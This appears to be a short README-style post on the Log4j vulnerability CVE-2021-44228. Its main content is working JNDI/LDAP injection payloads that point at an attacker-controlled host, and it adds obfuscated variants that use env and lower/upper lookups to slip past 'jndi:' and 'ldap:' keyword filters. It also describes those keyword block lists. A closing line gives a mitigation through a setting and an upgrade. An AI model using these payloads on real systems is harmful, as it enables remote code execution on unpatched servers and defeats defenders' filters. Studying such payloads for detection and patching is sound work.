🐱‍💻 ✂️ 🤬 LOG4J Java exploit - A trick to bypass words blocking patches

**CVE-2021-44228** works on:

log4j: 2.0 <= Apache log4j <= 2.14.1

Java version already patched: 6u211+, 7u201+, 8u191+,  11.0.1+.

Simple attacker script (Possible RCE):


`${jndi:ldap://somesitehackerofhell.com/z}`

Many developers started to block phrases:
- "ldap:"
- "jndi:"
  
to secure applications.


However, the attacker can bypass it by using one of these techniques:

## 1. System environment variables
   
`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}`

From Apache Log4j 2 documentation: `${env:ENV_NAME:-default_value}`

If there is no **ENV_NAME** system environment variable, use text after **:-** 

The attacker can use any name instead of **ENV_NAME**, but it has to no exists.


On windows, you can check your system environment variables in PowerShell by writing:

`dir env:`



## 2. Lower or Upper Lookup

`${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}`

**Lower Lookup**
The LowerLookup converts the passed in argument to lower case. Presumably the value will be the
result of a nested lookup.


`${lower:<text>}`


**Upper Lookup**
The UpperLookup converts the passed in argument to upper case. Presumably the value will be the
result of a nested lookup.


`${upper:<text>}`

# ✨ Best solution to protect from CVE-2021-44228
Start your server with `log4j2.formatMsgNoLookups` set to `true`, or update to `log4j-2.15.0-rc1` or later.

Keep it safe!
